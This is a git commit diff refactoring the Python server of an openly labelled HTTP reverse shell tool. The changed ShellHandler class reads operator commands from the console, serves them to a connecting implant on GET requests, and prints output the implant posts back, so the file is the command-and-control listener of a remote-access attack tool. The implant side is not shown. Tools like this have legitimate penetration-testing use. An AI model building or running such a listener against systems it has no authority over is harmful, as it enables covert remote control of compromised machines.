2be60d9fc9e1f1d631bca5f923e2a14d651c0de2
EONRaider <livewire_voodoo@protonmail.com>
2021-11-01 18:26:47 -0300

    Refactor ShellHandler class
    - Added "shell_prompt" property
    - Added "_split_path" method
    - Re-implemented "do_GET" and "do_POST" methods
    - Minor modifications to main execution context
    - Modified docstrings

--- src/server/server.py
+++ src/server/server.py
@@ -3,35 +3,57 @@
 
 __author__ = "EONRaider @ keybase.io/eonraider"
 
+import re
 from http.server import BaseHTTPRequestHandler, HTTPServer
+from socketserver import BaseServer
 from urllib.parse import parse_qs
 
-from src.server import routes
+from src.server.routes import ServerRoutes
 
 
 class ShellHandler(BaseHTTPRequestHandler):
+    def __init__(self,
+                 request: bytes,
+                 client_address: [str, int],
+                 server: BaseServer):
+        self.routes = ServerRoutes(self)
+        self.route = None
+        self.subpath = None
+        self.data = None
+        super().__init__(request, client_address, server)
+
+    @property
+    def shell_prompt(self):
+        user, host, pwd = self.headers.get("X-Shell-Prompt").split(";")
+        return f"{user}@{host}:{pwd}$ "
+
     def do_GET(self):
-        shell_prompt = f"{self.headers.get('username')}" \
-                       f"@{self.headers.get('hostname')}" \
-                       f":{self.headers.get('cwd')}$ "
-        command = input(shell_prompt)
+        try:
+            response = input(self.shell_prompt)
+        except EOFError:
+            raise KeyboardInterrupt
         self.send_response(200)
         self.send_header("Content-type", "text/html")
         self.end_headers()
-        self.wfile.write(command.encode())
+        self.wfile.write(response.encode())
 
     def do_POST(self):
         length = int(self.headers['Content-Length'])
-        request_body: dict = parse_qs(self.rfile.read(length).decode())
-        if (route := self.path.lstrip("/")) in routes.server_routes:
-            getattr(routes, route)(request_body)
-        else:
-            print(*request_body.get("contents", ""), end="")
+        self.data = parse_qs(self.rfile.read(length).decode())
+        self.route, self.subpath = self._split_path()
+        try:
+            getattr(self.routes, self.route)()
+        except AttributeError:
+            print(*self.data.get("contents", ""), end="")
         self.send_response(200)
         self.end_headers()
 
+    def _split_path(self):
+        split_path = re.match(r"/(.*)/(.*)$", self.path)
+        return "webroot", "" if split_path is None else split_path.groups()
+
     def log_message(self, *args, **kwargs):
-        """Suppress output of log messages."""
+        """Suppress sending of log messages to STDOUT."""
         pass
 
 
@@ -39,7 +61,7 @@ if __name__ == '__main__':
     import argparse
 
     parser = argparse.ArgumentParser(
-        description="Basic HTTP Reverse Shell Server by BlackCode Academy")
+        description="Basic HTTP Reverse Shell Server")
     parser.add_argument("host",
                         type=str,
                         help="Server address or hostname.")
@@ -51,9 +73,9 @@ if __name__ == '__main__':
 
     server_sock = _args.host, _args.port
 
-    with HTTPServer(server_sock, ShellHandler) as server:
+    with HTTPServer(server_sock, ShellHandler) as http_server:
         try:
             print('[>>>] Server started on http://{}:{}'.format(*server_sock))
-            server.serve_forever()
+            http_server.serve_forever()
         except KeyboardInterrupt:
             print('\n[!] Shutting down the server...')
